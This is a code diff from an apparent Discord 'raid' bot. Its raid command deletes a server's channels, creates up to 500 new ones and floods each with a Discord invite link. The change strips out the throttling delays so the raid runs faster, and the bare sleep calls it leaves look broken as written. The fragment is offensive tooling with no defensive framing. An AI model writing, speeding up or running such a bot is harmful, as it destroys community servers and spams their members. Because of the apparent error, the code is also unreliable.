@@ -602,7 +602,7 @@ async def raid(ctx):
     for channel in channels_to_delete:
         try:
             await channel.delete()
-            await asyncio.sleep(0.1)
+            await asyncio.sleep()
         except:
             pass
     for i in range(1, 501):
@@ -612,11 +612,11 @@ async def raid(ctx):
                 for _ in range(5):
                     try:
                         await target_channel.send("https://discord.gg/deltax")
-                        await asyncio.sleep(0.1)
+                        await asyncio.sleep()
                     except:
                         break
             bot.loop.create_task(send_spam(new_channel))
-            await asyncio.sleep(0.1)
+            await asyncio.sleep()
         except:
             break
 
